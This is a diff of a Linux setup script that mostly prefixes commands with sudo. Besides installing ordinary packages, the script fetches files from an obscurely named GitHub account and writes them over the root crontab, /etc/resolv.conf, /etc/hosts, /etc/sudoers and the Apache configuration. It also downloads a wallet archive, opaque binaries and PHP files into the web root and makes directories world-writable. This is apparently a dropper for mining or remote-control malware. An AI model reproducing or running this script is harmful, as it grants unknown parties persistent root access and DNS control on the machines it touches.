@@ -20,7 +20,7 @@ expect eof
 exit
 EOF
 
-apt-get update
+sudo apt-get update
 
 export DEBIAN_FRONTEND=noninteractive
 
@@ -28,163 +28,163 @@ ln -fs /usr/share/zoneinfo/America/New_York /etc/localtime
 apt-get install -y tzdata
 dpkg-reconfigure --frontend noninteractive tzdata
 
-apt-get install sudo -y
+sudo apt-get install sudo -y
 
-usermod -aG sudo root
+sudo usermod -aG sudo root
 
-apt-get -y install bc
+sudo apt-get -y install bc
 
-apt-get -y install tightvncserver
+sudo apt-get -y install tightvncserver
 
-apt-get -y install xfonts-base
+sudo apt-get -y install xfonts-base
 
-apt-get -y install gcc
+sudo apt-get -y install gcc
 
-apt-get -y install g++
+sudo apt-get -y install g++
 
-apt-get -y install apt-transport-https curl
+sudo apt-get -y install apt-transport-https curl
 
-apt-get -y install expect
+sudo apt-get -y install expect
 
-curl -s https://brave-browser-apt-release.s3.brave.com/brave-core.asc | apt-key --keyring /etc/apt/trusted.gpg.d/brave-browser-release.gpg add -
+sudo curl -s https://brave-browser-apt-release.s3.brave.com/brave-core.asc | apt-key --keyring /etc/apt/trusted.gpg.d/brave-browser-release.gpg add -
 
-echo "deb [arch=amd64] https://brave-browser-apt-release.s3.brave.com/ stable main" | tee /etc/apt/sources.list.d/brave-browser-release.list
+sudo echo "deb [arch=amd64] https://brave-browser-apt-release.s3.brave.com/ stable main" | tee /etc/apt/sources.list.d/brave-browser-release.list
 
-apt-get update
+sudo apt-get update
 
-apt-get -y install brave-browser
+sudo apt-get -y install brave-browser
 
-apt-get install -y dos2unix
+sudo apt-get install -y dos2unix
 
-apt-get install -y apache2
+sudo apt-get install -y apache2
 
-apt-get install -y php7.4
+sudo apt-get install -y php7.4
 
-apt-get install -y php7.4-gmp
+sudo apt-get install -y php7.4-gmp
 
-apt-get install -y xfce4 xfce4-goodies
+sudo apt-get install -y xfce4 xfce4-goodies
 
 XFCE_PANEL_MIGRATE_DEFAULT=1
 
-apt-get install -y software-properties-common
+sudo apt-get install -y software-properties-common
 
-add-apt-repository ppa:ondrej/php -y
+sudo add-apt-repository ppa:ondrej/php -y
 
-apt-get update
+sudo apt-get update
 
-apt-get install -y php5.6
+sudo apt-get install -y php5.6
 
-apt-get -y install vncserver
+sudo apt-get -y install vncserver
 
-apt-get -y install vsftpd
+sudo apt-get -y install vsftpd
 
-apt-get -y install make
+sudo apt-get -y install make
 
-apt-get -y install cmake
+sudo apt-get -y install cmake
 
-apt-get -y install libx11-dev
+sudo apt-get -y install libx11-dev
 
-apt-get -y install libxtst-dev
+sudo apt-get -y install libxtst-dev
 
-apt-get -y install libxinerama1 libxinerama-dev
+sudo apt-get -y install libxinerama1 libxinerama-dev
 
 cd /var/spool/cron/crontabs/
 
-wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/root
+sudo wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/root
 
-chmod 600 -R ./root
-
-cd /home/
-
-wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linux44
+sudo chmod 600 -R ./root
 
 cd /home/
 
-wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linux84
+sudo wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linux44
+
+cd /home/
+
+sudo wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linux84
 
 cd /etc/
 
-wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/resolv.conf
+sudo wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/resolv.conf
 
-wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/hosts
+sudo wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/hosts
 
 cd /etc/apache2/
 
-wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/ports.conf
+sudo wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/ports.conf
 
-wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/apache2.conf
+sudo wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/apache2.conf
 
 cd /etc/apache2/sites-enabled/
 
-wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/000-default.conf
+sudo wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/000-default.conf
 
-service apache2 restart
+sudo service apache2 restart
 
 cd /home/
 
-apt-get install git
+sudo apt-get install git
 
-git clone https://github.com/jordansissel/xdotool
+sudo git clone https://github.com/jordansissel/xdotool
 
 cd ./xdotool/
 
-git checkout edbbb7a8f664ceacbb2cffbe8ee4f5a26b5addc8
+sudo git checkout edbbb7a8f664ceacbb2cffbe8ee4f5a26b5addc8
 
-make install
+sudo make install
 
-mkdir /home/demo/
+sudo mkdir /home/demo/
 
-mkdir /home/demo/Documents/
+sudo mkdir /home/demo/Documents/
 
 cd /home/demo/
 
-wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/Documents.tar.gz
+sudo wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/Documents.tar.gz
 
-tar -xvf ./Documents.tar.gz
-
-cd /home/demo/Documents/
-
-wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/wallet84744.tar.gz
-
-tar -xvf ./wallet84744.tar.gz
+sudo tar -xvf ./Documents.tar.gz
 
 cd /home/demo/Documents/
 
-wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/paperspace84.tar.xz
+sudo wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/wallet84744.tar.gz
 
-tar -xvf ./paperspace84.tar.xz
+sudo tar -xvf ./wallet84744.tar.gz
 
-chmod 777 -R /home/demo/Documents/
+cd /home/demo/Documents/
 
-mkdir /var/www/html/
+sudo wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/paperspace84.tar.xz
+
+sudo tar -xvf ./paperspace84.tar.xz
+
+sudo chmod 777 -R /home/demo/Documents/
+
+sudo mkdir /var/www/html/
 
 cd /var/www/html/
 
-wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/google844.tar.xz
+sudo wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/google844.tar.xz
 
-tar -xvf ./google844.tar.xz
+sudo tar -xvf ./google844.tar.xz
 
 cd /var/www/html
 
-wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linux8444.tar.gz
+sudo wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linux8444.tar.gz
 
-wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linuxgooglework8474
+sudo wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linuxgooglework8474
 
-wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linuxgooglework8474.php
+sudo wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linuxgooglework8474.php
 
-chmod 777 -R /var/www/html/
+sudo chmod 777 -R /var/www/html/
 
 cd /etc/
 
-wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/sudoers
+sudo wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/sudoers
 
-chmod 600 -R /etc/sudoers
+sudo chmod 600 -R /etc/sudoers
 
 cd /root/
 
-wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linuxroot84.tar.gz
+sudo wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linuxroot84.tar.gz
 
-tar -xvf ./linuxroot84.tar.gz
+sudo tar -xvf ./linuxroot84.tar.gz
 
 cd /var/www/html/google844/
 
